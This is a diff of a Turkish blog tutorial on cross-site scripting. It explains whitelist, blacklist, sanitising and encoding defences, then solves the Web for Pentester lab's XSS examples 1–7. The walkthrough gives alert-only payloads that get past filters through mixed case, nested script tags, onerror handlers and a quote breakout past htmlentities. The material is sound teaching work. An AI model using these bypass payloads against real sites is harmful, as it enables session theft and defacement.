-<p>Pozitif girdi denetimi olarakta bilinen bu çözüm metodunda kullanıcıdan gelecek olan verilerin(karakterlerin, kelimelerin vs) hangilerine izin verileceği belirtilir. Örnek vermek gerekirse kullanıcıdan sadece alfanumeric değerler  alıyor isek  (yani A'dan Z'ye ve 0'dan 9'a) bunu regex ile ifade ederek sadece kabul edeceğimiz verileri belirleriz. Bu durumda kullanıcıdan gelecek olan özel karakterlerin bütününü kabul etmemiş oluruz. Başka bir örnek daha verecek olursak kullanıcıdan aldığımız değerler sadece belli kelimeler veya ifadelerden ibaret ise sadece kabul edebileceklerimizi belirler, belirlediğimiz değerler dışında gelen değerleri işleme almayız.<br/>
-<br/></p>
+<p>Pozitif girdi denetimi olarakta bilinen bu çözüm metodunda kullanıcıdan gelecek olan verilerin(karakterlerin, kelimelerin vs) hangilerine izin verileceği belirtilir. Örnek vermek gerekirse kullanıcıdan sadece alfanumeric değerler  alıyor isek  (yani A'dan Z'ye ve 0'dan 9'a) bunu regex ile ifade ederek sadece kabul edeceğimiz verileri belirleriz. Bu durumda kullanıcıdan gelecek olan özel karakterlerin bütününü kabul etmemiş oluruz. Başka bir örnek daha verecek olursak kullanıcıdan aldığımız değerler sadece belli kelimeler veya ifadelerden ibaret ise sadece kabul edebileceklerimizi belirler, belirlediğimiz değerler dışında gelen değerleri işleme almayız.<br>
+<br/></br></p>
 <h5 id="black-list-teknigi"><strong>Black List Tekniği</strong></h5>
-<p>Bu teknikte ise white list'in aksine kullanıcıdan gelen veriler arasında kabul etmediklerimizi belirleriz. White list gibi sağlam görünse de aslında hiç öyle değildir. Bu çözüm tekniğinde olasılıklar çok fazla ve bir tanesinin bile gözünüzden kaçması zafiyete sebeb olmaktadır. <code>&lt; , ' , &gt; , "</code> karakterlerini engellediğinizde bunların hex formatını da engelleyeceksiniz encode edilmiş hallini de engelleyeceksiniz yazılan koda göre değişiklik göstermekle beraber bazen bu karakterler kullanılmadan da zafiyet oluşabilmektedir. Bu durumda script kelimesini engellemelisiniz, alert, prompt, confirm, hex formatları, char formatları vs vs külfetten başka bir şey değil gördüğünüz gibi olasılıklar çok fazla çünkü.<br/>
-<br/></p>
+<p>Bu teknikte ise white list'in aksine kullanıcıdan gelen veriler arasında kabul etmediklerimizi belirleriz. White list gibi sağlam görünse de aslında hiç öyle değildir. Bu çözüm tekniğinde olasılıklar çok fazla ve bir tanesinin bile gözünüzden kaçması zafiyete sebeb olmaktadır. <code>&lt; , ' , &gt; , "</code> karakterlerini engellediğinizde bunların hex formatını da engelleyeceksiniz encode edilmiş hallini de engelleyeceksiniz yazılan koda göre değişiklik göstermekle beraber bazen bu karakterler kullanılmadan da zafiyet oluşabilmektedir. Bu durumda script kelimesini engellemelisiniz, alert, prompt, confirm, hex formatları, char formatları vs vs külfetten başka bir şey değil gördüğünüz gibi olasılıklar çok fazla çünkü.<br>
+<br/></br></p>
 <h5 id="sanitize"><strong>Sanitize</strong></h5>
-<p>Sanitize yönteminde kullanıcıdan gelen veri arıtılır/temizlenir. Kullanıcıdan gelen veriler arasında yasaklı karakterler(black list)/izin verilmeyen karakterler(white list) bulunmasına rağmen bunu işleme almamak yerine veri içerisindeki zararlı/istenmeyen karakterler veriden çıkarılarak verinin temizlendikten sonra işleme alınması yöntemidir. Bu çözüm yoluda geliştirdiğiniz uygulamadada xss zafiyeti bırakma olasılığınızı çok çok düşürmektedir.<br/>
-<br/></p>
+<p>Sanitize yönteminde kullanıcıdan gelen veri arıtılır/temizlenir. Kullanıcıdan gelen veriler arasında yasaklı karakterler(black list)/izin verilmeyen karakterler(white list) bulunmasına rağmen bunu işleme almamak yerine veri içerisindeki zararlı/istenmeyen karakterler veriden çıkarılarak verinin temizlendikten sonra işleme alınması yöntemidir. Bu çözüm yoluda geliştirdiğiniz uygulamadada xss zafiyeti bırakma olasılığınızı çok çok düşürmektedir.<br>
+<br/></br></p>
 <h5 id="encoding"><strong>Encoding</strong></h5>
 <p>Gelen veri içerisindeki özel karakterlerin başka bir formata dönüştürülüp artık özel anlamını yitirmesi durumudur. Yukarıda dom-based xss türünde firefox tarayıcısının kullanıcılarını bu zafiyetten korumak için tam olarak yaptığı encoding işlemidir. Html ve url encoding web saldırılarından korunmak için en sık başvurulan kodlamalardandır. <code>&lt;, &gt;, ', "</code> gibi karakterleri encode işleminden geçirdiğinizde bazı web tabanlı saldırılarından(sqli, xss, code inj.) korunmak için kayda değer bir önlem almış olursunuz, ama tabiki tek başına bu çözüm yeterli değildir.    </p>
 <p>Geliştireceğiniz uygulamada yukarıda sunulan çözüm stratejilerinden birkaçını beraber kullanırsanız bu zafiyete mahal vermemiş olursunuz. Girdiyi birkaç aşamadan geçirdiğinizde güvenliği artırmış olursunuz. Yani önce white ve black list yöntemi ile girdiyi temizle sonra encoding uygula en sonunda veriyi işleme al.</p>
@@ -311,85 +311,85 @@ Kullanırken dikkat edilmediği taktirde dom-based xss zafiyetine sebeb veren js
 <p><br/></p>
 <h2 id="web-for-pentester"><strong>Web for Pentester</strong></h2>
 <p>Bu teorik bilgilerimizi uygulamayabilmek için bir pentest lab ortamı kuracağız. Bunun için <a href="https://isos.pentesterlab.com/web_for_pentester_i386.iso">bu linkte</a> bulunan iso dosyasını indirip wmware veya virtual box gibi sanallaştırma yazılımlarını kullanarak çalıştıracağız. Ve bu sanal makinenin ip adresini kendi tarayıcımıza yazdığımızda aşağıdaki ekranla karşılaşırsak nema problema.  Googledan <code>web for pentester</code> diye aratırsanız sayfalarca sonuç çıkacaktır.
-<img alt="web-for-pentester" src="img/web-for-pentester-index.jpg"/> </p>
+<img alt="web-for-pentester" src="img/web-for-pentester-index.jpg"> </img></p>
 <div class="highlight"><pre><span></span>Xss zafiyeti araken körü körüne random payloadlar yazmak yerine, ilgili parametreye doğrudan bütün özel karakterleri (&lt;,',&lt;,") yazıp hangilerinin filtrelendiğini görebiliriz, ve buna dayanarak daha makul ve yerinde payladlar yazarak zamandan tasaruf edebiliriz.
 </pre></div>
 <p><em>Şimdi XSS kategorisindeki caseleri çözmeye başlayalım.</em> </p>
 <h4 id="example-1"><strong>Example 1</strong></h4>
-<p>Url'de <code>http://192.168.46.128/xss/example1.php?name=</code> gördüğünüz üzere example1.php dosyası, get metodu ile name parametresine aldığı değeri ekrana basılıyor. Yukarıdaki trickte bahsettiğimiz gibi özel karakterlerimizi yazarak sayfanın kaynak kodunda oluşan değişimi gözlemleyip ona göre payload geliştirelim.<br/>
-<img alt="xss-case1-html-source-code" src="/img/xss-case1-html-source-code.jpg"/> </p>
-<p>Gördüğünüz üzere en ufak bi filtreleme yok. Yazdığımız bütün karakterler ekrana yansıdı. İlk örnek olduğu için en temel xss payloadımız olan <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>yazalım.<br/>
-<img alt="xss-case1-alert" src="/img/xss-case1-alert.jpg"/> </p>
-<p>Alerti başarılı bir şekilde aldık. Şimdi kaynak koduna bakıp 2. Örneğe geçelim.<br/>
-<img alt="xss-case1-source-code" src="/img/xss-case1-source-code.jpg"/> <br/> </p>
+<p>Url'de <code>http://192.168.46.128/xss/example1.php?name=</code> gördüğünüz üzere example1.php dosyası, get metodu ile name parametresine aldığı değeri ekrana basılıyor. Yukarıdaki trickte bahsettiğimiz gibi özel karakterlerimizi yazarak sayfanın kaynak kodunda oluşan değişimi gözlemleyip ona göre payload geliştirelim.<br>
+<img alt="xss-case1-html-source-code" src="/img/xss-case1-html-source-code.jpg"> </img></br></p>
+<p>Gördüğünüz üzere en ufak bi filtreleme yok. Yazdığımız bütün karakterler ekrana yansıdı. İlk örnek olduğu için en temel xss payloadımız olan <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>yazalım.<br>
+<img alt="xss-case1-alert" src="/img/xss-case1-alert.jpg"> </img></br></p>
+<p>Alerti başarılı bir şekilde aldık. Şimdi kaynak koduna bakıp 2. Örneğe geçelim.<br>
+<img alt="xss-case1-source-code" src="/img/xss-case1-source-code.jpg"> <br/> </img></br></p>
 <p>Kaynak koddan gördüğünüz gibi kullanıcıdan gelen veri hiç süzülmeden doğrudan ekrana basılmaktadır. Bundan daha büyük hata olabilir mi?  </p>
 <p><br/></p>
 <h4 id="example-2"><strong>Example 2</strong></h4>
-<p>Url yapısı ilk casemiz ile aynı. Ancak ilk örnekte kullandığımız payloadı burda denediğimizde text olarak <code>“Hello alert(1)”</code> çıktısını alıyoruz.<br/>
-<img alt="xss-case2-html-source-code" src="/img/xss-case2-html-source-code.jpg"/> </p>
+<p>Url yapısı ilk casemiz ile aynı. Ancak ilk örnekte kullandığımız payloadı burda denediğimizde text olarak <code>“Hello alert(1)”</code> çıktısını alıyoruz.<br>
+<img alt="xss-case2-html-source-code" src="/img/xss-case2-html-source-code.jpg"> </img></br></p>
 <p>Burda olan işlemden şu sonucu çıkarabiliriz; yazdığımız javascript kodu çalışmadı. Çünkü ekranda alert(1) ifadesi text olarak göründü bunun anlamı ise geliştirici script keywordunü filtrelemiş. Peki bunu nasıl bypass ederiz? 
-En temel şekilde büyük-küçük yazarız.<br/>
-Payloadımız: <code>&lt;ScRipt&gt;alert(1)&lt;/sCriPT&gt;</code> <br/>
-<img alt="xss-case2-source-code" src="/img/xss-case2-source-code.jpg"/> </p>
+En temel şekilde büyük-küçük yazarız.<br>
+Payloadımız: <code>&lt;ScRipt&gt;alert(1)&lt;/sCriPT&gt;</code> <br>
+<img alt="xss-case2-source-code" src="/img/xss-case2-source-code.jpg"> </img></br></br></p>
 <p>Kaynak kodu incelediğimizde, get metoduyla name parametresine verilen değer name değişkenine atanmıştır ve <code>preg_replace()</code> fonksiyonu sayesinde name değişkeninde eğer <code>&lt;script&gt;</code> veya <code>&lt;/script&gt;</code> kelimeleri geçiyor ise bunları silmektedir/değiştirmektedir.</p>
 <p><br/></p>
 <h4 id="example-3"><strong>Example 3</strong></h4>
-<p>Url adresimizdeki name parametresi dikkatimizi çekmiş olmalı. Özel karakterlerimizi kullanıp herhangi bir filtrelenme var mı diye kontrol edelim. Sayfanın kaynak koduna baktığımızda özel karakterlerimizin filtrelenmediğini görürüz. Ve sazan gibi en temel payloadımız olan <code>&lt;script&gt;alert(1) &lt;/script&gt;</code> yazıyoruz. Hopaaa! Script keywordu engellenmiş :/<br/>
-<img alt="xss-case3-html-source-code" src="/img/xss-case3-html-source-code.jpg"/> </p>
-<p>script keywordunu büyük-küçük yazmamıza rağmen işe yaramayacaktır. O zaman ne yapabiliriz? Okumayı burda bırakıp biraz düşünün :)<br/>
-Cevap, iç içe yazmak. Yani <code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code> . Bu payload arkada nasıl işleyecek peki? Name parametesine yazacağımız payloadlarda geçen <code>&lt;script&gt;</code> keywordlerini sileceği için geriye yine <code>&lt;script&gt;</code> keywordu kalacaktır. Ve payloadımız başarıyla çalışacaktır.<br/>
-<img alt="xss-case3-alert" src="/img/xss-case3-alert.jpg"/> </p>
-<p>Yani uzun lafın kısası payloadımız: <code>&lt;scri&lt;script&gt;pt&gt;alert(1)&lt;/scri&lt;/script&gt;pt&gt;</code> <br/>
-<img alt="xss-case3-source-code" src="/img/xss-case3-source-code.jpg"/> </p>
+<p>Url adresimizdeki name parametresi dikkatimizi çekmiş olmalı. Özel karakterlerimizi kullanıp herhangi bir filtrelenme var mı diye kontrol edelim. Sayfanın kaynak koduna baktığımızda özel karakterlerimizin filtrelenmediğini görürüz. Ve sazan gibi en temel payloadımız olan <code>&lt;script&gt;alert(1) &lt;/script&gt;</code> yazıyoruz. Hopaaa! Script keywordu engellenmiş :/<br>
+<img alt="xss-case3-html-source-code" src="/img/xss-case3-html-source-code.jpg"> </img></br></p>
+<p>script keywordunu büyük-küçük yazmamıza rağmen işe yaramayacaktır. O zaman ne yapabiliriz? Okumayı burda bırakıp biraz düşünün :)<br>
+Cevap, iç içe yazmak. Yani <code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code> . Bu payload arkada nasıl işleyecek peki? Name parametesine yazacağımız payloadlarda geçen <code>&lt;script&gt;</code> keywordlerini sileceği için geriye yine <code>&lt;script&gt;</code> keywordu kalacaktır. Ve payloadımız başarıyla çalışacaktır.<br>
+<img alt="xss-case3-alert" src="/img/xss-case3-alert.jpg"> </img></br></br></p>
+<p>Yani uzun lafın kısası payloadımız: <code>&lt;scri&lt;script&gt;pt&gt;alert(1)&lt;/scri&lt;/script&gt;pt&gt;</code> <br>
+<img alt="xss-case3-source-code" src="/img/xss-case3-source-code.jpg"> </img></br></p>
 <p>Kaynak kodu incelediğimizde gördüğümüz gibi script kelimesi temizleniyor.  </p>
 <div class="highlight"><pre><span></span>Regex de /i ifadesi büyük-küçük harflere karşı duyarsızlığı ifade ediyor. Yani siz aLeRt veya alert de yazsanız farketmeyecek ikisinide engelleyecektir.
 </pre></div>
 <p><br/></p>
 <h4 id="example-4"><strong>Example 4</strong></h4>
-<p>Örnek4 de ise şimdiye kadar denediğimiz 3 payloadın bu örnekte çalışmadığını göreceğiz. Payloadlarımızı yazıp html kaynak kodlarına baktığımızda aşağıda bulunan resimdeki gibi bir sonuç aldığımızı görüyoruz. Sayfanın kaynak koduna baktığımızda sadece “error” ibaresini göreceğiz. Büyük olasılıkla geliştirici name parametresine verilen değerde script veya alert gibi özel kelimeleri filtrelemiştir. Ve bu kelimeler kullanıldıldığı taktirde die() veya error() gibi fonksiyonlarla çalışan betiği sonlandırır. Bu noktada bizim yazacağımız kod bu kelime(ler)i içermeyen bir payload yazmaktır. Bunu da html taglarındaki attributleri kullanarak yapacağız. Yani bir html etiketinin atributtune js kodu yazacağız. Örneğin şöyle; <code>&lt;img src=x onerror=alert(1)&gt;</code> gördüğünüz üzere hiç script kelimesini kullanmadık. Bu payloadda src adında bir imaj yüklemeye çalıştık eğer yükleyemez, bir hata meydana gelir ise onerror attributune vereceğimiz alert ile ekrana 1 yazacak. Payloadımızı denediğimizde çalışacağını göreceğiz. Alternatif olarak <code>&lt;svg src=x onerror=alert(1)&gt;</code> çalışacaktır hatta benzer yapıya sahip başka html etiketleri de çalışacaktır.<br/>
-<img alt="xss-case4-html-source-code" src="/img/xss-case4-html-source-code.jpg"/> </p>
-<p>Sayfanın kaynak koduna bakıldığında payloadımızın html syntaxına uygun olduğu görülecektir. Bundan dolayı sorunsuz bir şekilde çalıştı. Yazacağımız bütün payloadlarda bunu dikkate almalıyız. İlgili dilin syntaxına uygun olarak yazılacak ki payload çalışabilsin.<br/>
-<img alt="xss-case4-source-code" src="/img/xss-case4-source-code.jpg"/> </p>
+<p>Örnek4 de ise şimdiye kadar denediğimiz 3 payloadın bu örnekte çalışmadığını göreceğiz. Payloadlarımızı yazıp html kaynak kodlarına baktığımızda aşağıda bulunan resimdeki gibi bir sonuç aldığımızı görüyoruz. Sayfanın kaynak koduna baktığımızda sadece “error” ibaresini göreceğiz. Büyük olasılıkla geliştirici name parametresine verilen değerde script veya alert gibi özel kelimeleri filtrelemiştir. Ve bu kelimeler kullanıldıldığı taktirde die() veya error() gibi fonksiyonlarla çalışan betiği sonlandırır. Bu noktada bizim yazacağımız kod bu kelime(ler)i içermeyen bir payload yazmaktır. Bunu da html taglarındaki attributleri kullanarak yapacağız. Yani bir html etiketinin atributtune js kodu yazacağız. Örneğin şöyle; <code>&lt;img src=x onerror=alert(1)&gt;</code> gördüğünüz üzere hiç script kelimesini kullanmadık. Bu payloadda src adında bir imaj yüklemeye çalıştık eğer yükleyemez, bir hata meydana gelir ise onerror attributune vereceğimiz alert ile ekrana 1 yazacak. Payloadımızı denediğimizde çalışacağını göreceğiz. Alternatif olarak <code>&lt;svg src=x onerror=alert(1)&gt;</code> çalışacaktır hatta benzer yapıya sahip başka html etiketleri de çalışacaktır.<br>
+<img alt="xss-case4-html-source-code" src="/img/xss-case4-html-source-code.jpg"> </img></br></p>
+<p>Sayfanın kaynak koduna bakıldığında payloadımızın html syntaxına uygun olduğu görülecektir. Bundan dolayı sorunsuz bir şekilde çalıştı. Yazacağımız bütün payloadlarda bunu dikkate almalıyız. İlgili dilin syntaxına uygun olarak yazılacak ki payload çalışabilsin.<br>
+<img alt="xss-case4-source-code" src="/img/xss-case4-source-code.jpg"> </img></br></p>
 <p>Şimdi kaynak kodu inceleyelim. Evet gördüğünüz gibi aynen düşündüğümüz gibi Regex ifadesi kullanılarak script kelimesinin name parametresine verilmesi durumunda die komutu ile sayfanın geri kalanını çalıştırmayacak şekilde error verdirilmiş.  </p>
 <p><br/></p>
 <h4 id="example-5"><strong>Example 5</strong></h4>
-<p>Artık tahmin edeceğiniz gibi bir sonraki örnekte şimdiye kadar denediğimiz hiçbir payload çalışmayacaktır.  Normal bir payload yazdığımızda önceki örnekte olduğu gibi error ifadesini ekrana basıyor. Muhtemelen yine özel keywordlerden biri engellenmiştir. Şu ana kadar hep <code>alert()</code> ile ekrana birşeyler basmaya çalıştık ama tek kod bu değil. Benim bildiğim 2 komut daha var. Birincisi ekrana hem alert gibi pencere açıp aynı zamanda kullanıcıdan girdi alan <code>prompt()</code>, bir de kullanıcıdan onay isteyen <code>confirm()</code> kodu. Bunlar dışında başka popup boxlar da olabilir, benim bildiğim bu üçü. O zaman bu durumda payloadımız nasıl olacak?<br/>
-<code>&lt;script&gt;prompt(1)&lt;/script&gt;</code> veya <code>&lt;script&gt;confirm(1)&lt;/script&gt;</code> her iki payload da sorunsuz çalışacaktır.<br/>
-<img alt="xss-case5-alert" src="/img/xss-case5-alert.jpg"/> </p>
-<p>Ctrl+u ile sayfanın kaynak kodlarına bakalım. Aşağıda gördüğünüz üzere yazdığımız payload script tagleri arasında ilgili yere yazılmış. Burda önemli olan nokta yazdığımız payload javascript syntaxını bozmadan yazılmış olmasıdır. Zaten syntaxı bozarsanız payloadınız çalışmayacaktır. Bu nedenle xss ararken deneme amaçlı yazdığınız payloadları sayfanın kaynak kodundaki değişimlerden takip ederek daha isabetli atışlar yapabilirsinizi.  <br/>
-<img alt="xss-case5-html-source-code" src="/img/xss-case6-html-source-code.jpg"/> </p>
-<p>Şimdi php tarafındaki kaynak kodları görelim;<br/>
-<img alt="xss-case5-source-code" src="/img/xss-case5-source-code.jpg"/><br/>
-<code>preg_match()</code> fonksiyonunun yaptığı şudur; Eğer birinci parametredeki değer, ikinci parametredeki veri içerisinde geçiyor ise true döner, geçmiyor ise false döner. Bu örnekte ilk parametremiz alert kelimesi oluyor ve \i ifadesinden dolayı (harf duyarlılığı olmaksızın) alert kelimesinin, get metoduyla alınan name parametresindeki değer içerisinde geçmesi durumunda fonksiyonumuz true dönecektir.  </p>
+<p>Artık tahmin edeceğiniz gibi bir sonraki örnekte şimdiye kadar denediğimiz hiçbir payload çalışmayacaktır.  Normal bir payload yazdığımızda önceki örnekte olduğu gibi error ifadesini ekrana basıyor. Muhtemelen yine özel keywordlerden biri engellenmiştir. Şu ana kadar hep <code>alert()</code> ile ekrana birşeyler basmaya çalıştık ama tek kod bu değil. Benim bildiğim 2 komut daha var. Birincisi ekrana hem alert gibi pencere açıp aynı zamanda kullanıcıdan girdi alan <code>prompt()</code>, bir de kullanıcıdan onay isteyen <code>confirm()</code> kodu. Bunlar dışında başka popup boxlar da olabilir, benim bildiğim bu üçü. O zaman bu durumda payloadımız nasıl olacak?<br>
+<code>&lt;script&gt;prompt(1)&lt;/script&gt;</code> veya <code>&lt;script&gt;confirm(1)&lt;/script&gt;</code> her iki payload da sorunsuz çalışacaktır.<br>
+<img alt="xss-case5-alert" src="/img/xss-case5-alert.jpg"> </img></br></br></p>
+<p>Ctrl+u ile sayfanın kaynak kodlarına bakalım. Aşağıda gördüğünüz üzere yazdığımız payload script tagleri arasında ilgili yere yazılmış. Burda önemli olan nokta yazdığımız payload javascript syntaxını bozmadan yazılmış olmasıdır. Zaten syntaxı bozarsanız payloadınız çalışmayacaktır. Bu nedenle xss ararken deneme amaçlı yazdığınız payloadları sayfanın kaynak kodundaki değişimlerden takip ederek daha isabetli atışlar yapabilirsinizi.  <br>
+<img alt="xss-case5-html-source-code" src="/img/xss-case6-html-source-code.jpg"> </img></br></p>
+<p>Şimdi php tarafındaki kaynak kodları görelim;<br>
+<img alt="xss-case5-source-code" src="/img/xss-case5-source-code.jpg"><br>
+<code>preg_match()</code> fonksiyonunun yaptığı şudur; Eğer birinci parametredeki değer, ikinci parametredeki veri içerisinde geçiyor ise true döner, geçmiyor ise false döner. Bu örnekte ilk parametremiz alert kelimesi oluyor ve \i ifadesinden dolayı (harf duyarlılığı olmaksızın) alert kelimesinin, get metoduyla alınan name parametresindeki değer içerisinde geçmesi durumunda fonksiyonumuz true dönecektir.  </br></img></br></p>
 <p><br/></p>
 <h4 id="example-6"><strong>Example 6</strong></h4>
-<p>Öncellikle name parametresine “&lt;’&gt; şu 4 özel karakteri girelim bakalım ne olacak. Sayfanın kaynak kodundan anlaşılacağı üzere herhangi bir karakter filtrelenmesi söz konusu değil. Ctrl+u yaparak kaynak koda baktığımızda name parametresine girdiğimiz her değer script tagleri arasında bulunan a değişkenine atanıyor.<br/>
-<img alt="xss-case6-html-source-code" src="/img/xss-case6-html-source-code.jpg"/> </p>
+<p>Öncellikle name parametresine “&lt;’&gt; şu 4 özel karakteri girelim bakalım ne olacak. Sayfanın kaynak kodundan anlaşılacağı üzere herhangi bir karakter filtrelenmesi söz konusu değil. Ctrl+u yaparak kaynak koda baktığımızda name parametresine girdiğimiz her değer script tagleri arasında bulunan a değişkenine atanıyor.<br>
+<img alt="xss-case6-html-source-code" src="/img/xss-case6-html-source-code.jpg"> </img></br></p>
 <p>Bu durumda nasıl bir payload geliştirebiliriz? Düşünelim biraz…
-Öncellikle açılmış olan script tagini kapatalım. Daha sonra kendimiz bir script tagi açıp alert ile ekrana uyarıyı bastıktan sonra tagi kapatalım. Bazılarınız kapatmaya gerek yok zaten kendisi kapatmış diyebilir haklı olaraktan ancak sayfanın kaynak koduna baktığınızda “ ve ; işaretleri bize sorun oluşturacağından dolayı kendimiz kapatmamız gerekecektir. Uzun lafın kısası payloadımız;<br/>
+Öncellikle açılmış olan script tagini kapatalım. Daha sonra kendimiz bir script tagi açıp alert ile ekrana uyarıyı bastıktan sonra tagi kapatalım. Bazılarınız kapatmaya gerek yok zaten kendisi kapatmış diyebilir haklı olaraktan ancak sayfanın kaynak koduna baktığınızda “ ve ; işaretleri bize sorun oluşturacağından dolayı kendimiz kapatmamız gerekecektir. Uzun lafın kısası payloadımız;<br>
 <code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> şeklinde olacaktır.
-<img alt="xss-case6-alert" src="/img/xss-case6-alert.jpg"/> </p>
+<img alt="xss-case6-alert" src="/img/xss-case6-alert.jpg"> </img></br></p>
 <p>Bu örneğin kaynak koduna bakmaya gerek yok çünkü herhangi server side (php) tarafından bir filtreleme uygulanmamıştır. Sadece js kullanılmıştır. Sayfanın kaynak koduna bakıp ne tür bir filtreleme kullanıldığını görebilirsiniz.  </p>
 <p><br/></p>
 <h4 id="example7"><strong>Example7</strong></h4>
-<p>Sıra geldi 7. Örneğimize bu örnek extrem bir örnek olabilir.  Bu örneğimizde diğerlerinden farklı olarak önce kaynak koduna bakıp ona göre payload geliştireceğiz. Bu noktada; E biz nerden bilelim sitenin kaynak kodlarını diyebilirsiniz? (Demeyin!) Şöyle bir durum var. Bir çok açık kaynak template, hazır scriptler, cms ler var. Eğer hedefimiz bu public olan bir sistem/script kullanıyorsa o zaman kaynak kodlarını indirip inceleyip ona göre payload geliştirebilirsiniz. Durum böyle olduğu için sadece tek bir sitede değil ilgili scripti kullanan her sitede payloadınız çalışacaktır.<br/>
-<img alt="xss-case7-source-code" src="/img/xss-case7-source-code.jpg"/> </p>
-<div class="highlight"><pre><span></span><span class="x">Php de güvenlik adına çok önemli olan fonksiyonlardan biri de htmlentities() fonksiyonudur. Bu fonksiyon kendisine verilen her değerin içinde bulunan (&lt;, ", &gt;) ifadelerini sırasıyla (&amp;lt; , &amp;quot; , &amp;gt;) ifadelerine dönüştürür. Hatta 2. parametre olarak ENT_QUOTES değerini verirseniz ‘ (tek tırnağı da) engellemiş olursunuz. Tek tırnak ise &amp;</span><span class="err">#</span><span class="x">039; formatına dönüşür. Yani htmlentities(</span><span class="p">$</span><span class="nv">str</span><span class="x">, ENT_QUOTES) şeklinde kullanırsanız (&lt;, ', ", &gt;) bu 4 karakteri encoding ettiğinizden artık özel anlamlarını yitireceğinden bu karakterleri barındıran zararlı kodlar çalışmayacaktır. Bu saldırganın işini çok ama çok zorlaştırır. XSS ile veri aldığımız inputlardaki değeri bu fonksiyondan geçirirsek çok büyük bir olasılıkla xss saldırısından korunmuş olacağız. Bu nedenle bu fonksiyon geliştiriciler için bi’ nimettir. Ancak bazı nadir vardır ki bu fonksiyon kullanılmasına rağman xss zaafiyeti meydana yine meydana gelmektedir. Sıradaki örneğimizde işte bu nadir olan durumlardan birini göreceğiz.</span>
+<p>Sıra geldi 7. Örneğimize bu örnek extrem bir örnek olabilir.  Bu örneğimizde diğerlerinden farklı olarak önce kaynak koduna bakıp ona göre payload geliştireceğiz. Bu noktada; E biz nerden bilelim sitenin kaynak kodlarını diyebilirsiniz? (Demeyin!) Şöyle bir durum var. Bir çok açık kaynak template, hazır scriptler, cms ler var. Eğer hedefimiz bu public olan bir sistem/script kullanıyorsa o zaman kaynak kodlarını indirip inceleyip ona göre payload geliştirebilirsiniz. Durum böyle olduğu için sadece tek bir sitede değil ilgili scripti kullanan her sitede payloadınız çalışacaktır.<br>
+<img alt="xss-case7-source-code" src="/img/xss-case7-source-code.jpg"> </img></br></p>
+<div class="highlight"><pre><span></span>Php de güvenlik adına çok önemli olan fonksiyonlardan biri de htmlentities() fonksiyonudur. Bu fonksiyon kendisine verilen her değerin içinde bulunan (&lt;, ", &gt;) ifadelerini sırasıyla (&amp;lt; , &amp;quot; , &amp;gt;) ifadelerine dönüştürür. Hatta 2. parametre olarak ENT_QUOTES değerini verirseniz ‘ (tek tırnağı da) engellemiş olursunuz. Tek tırnak ise &amp;#039; formatına dönüşür. Yani htmlentities($str, ENT_QUOTES) şeklinde kullanırsanız (&lt;, ', ", &gt;) bu 4 karakteri encoding ettiğinizden artık özel anlamlarını yitireceğinden bu karakterleri barındıran zararlı kodlar çalışmayacaktır. Bu saldırganın işini çok ama çok zorlaştırır. XSS ile veri aldığımız inputlardaki değeri bu fonksiyondan geçirirsek çok büyük bir olasılıkla xss saldırısından korunmuş olacağız. Bu nedenle bu fonksiyon geliştiriciler için bi’ nimettir. Ancak bazı nadir vardır ki bu fonksiyon kullanılmasına rağman xss zaafiyeti meydana yine meydana gelmektedir. Sıradaki örneğimizde işte bu nadir olan durumlardan birini göreceğiz.
 </pre></div>
-<p>Şimdi bu kadar bilgiyi neden paylaştım? Çünkü sıradaki challangemızda inputtan alınan değer bu fonksiyondan geçmiştir. Ancak tek tırnağı da engellemek için opsiyonel olarak 2. Parametre de alabileceğini söylemiştik bu challangemızda 2. Parametre belirtilmemiştir. Bu da şu anlama gelmektedir; ‘ tırnak kullanabiliriz. Ve bir çok geliştirici bu fonksiyonu kullandığı zaman 2. Parametreyi belirtmez bu da saldırganın işini çok kolaylaştırmaktadır. Asıl mevzumuza gelelim şimdi.  Name parametresine özel karakterlerimizi girip sayfanın kaynak koduna bakıp meydana gelen değişimi gözlemleyelim.<br/>
-<img alt="xss-case7-html-source-code" src="/img/xss-case7-html-source-code.jpg"/> </p>
+<p>Şimdi bu kadar bilgiyi neden paylaştım? Çünkü sıradaki challangemızda inputtan alınan değer bu fonksiyondan geçmiştir. Ancak tek tırnağı da engellemek için opsiyonel olarak 2. Parametre de alabileceğini söylemiştik bu challangemızda 2. Parametre belirtilmemiştir. Bu da şu anlama gelmektedir; ‘ tırnak kullanabiliriz. Ve bir çok geliştirici bu fonksiyonu kullandığı zaman 2. Parametreyi belirtmez bu da saldırganın işini çok kolaylaştırmaktadır. Asıl mevzumuza gelelim şimdi.  Name parametresine özel karakterlerimizi girip sayfanın kaynak koduna bakıp meydana gelen değişimi gözlemleyelim.<br>
+<img alt="xss-case7-html-source-code" src="/img/xss-case7-html-source-code.jpg"> </img></br></p>
 <p>Gördüğünüz gibi sırasıyla &lt; ,  &gt; , “ karakterlerimiz; <code>&amp;alt;</code> , <code>&amp;gt;</code> , <code>&amp;quot;</code> karakterlerine dönüştürülerek güvenlik sağlanmaya çalışılmış AMA dikkat ettiyseniz ‘(tek tırnak) karakteri olduğu gibi kaldı. Bu bizim için çok önemli! Bir diğer önemli olan nokta ise; name parametresine yazdığımız değerin zaten <code>&lt;script&gt;</code> tagleri arasında işlenecek olmasıdır. Böylelikle &lt;, &gt; karakterlerini kullanmamıza gerek kalmayacak. Öte yandan sayfanın kaynak koduna baktığımızda yazdığımız değerin JS kısmında a diye bir değişkende ‘(tek tırnaklar) arasında tutulduğunu göreceğiz. Şimdi şöyle düşünelim ekrana alert vermek için öncellikle js tarafında olan a değişkeninin alacağı değerin ‘ işaretini kapatalım. Daha sonra ;(noktalı virgül) karakterimizi yazarak ilgili kod satırını sonlandıralım. Şimdi alert ifademizi yazabiliriz. Zaten JS kodunda önceden var olan sondaki ‘ işaretinden kaçmak içinde <code>//</code> karakterlerini kullanarak pasif ediyor. Yani şöyle bir şey oldu; 
-Payload:<code>musana’;alert(1)//</code><br/>
-<img alt="xss-case7-alert" src="/img/xss-case7-alert.jpg"/> </p>
+Payload:<code>musana’;alert(1)//</code><br>
+<img alt="xss-case7-alert" src="/img/xss-case7-alert.jpg"> </img></br></p>
 <p>Zaten payloadımızı js de ilgili yere yazdığımızda herhangi bir syntax hatasının olmadığını göreceğiz.
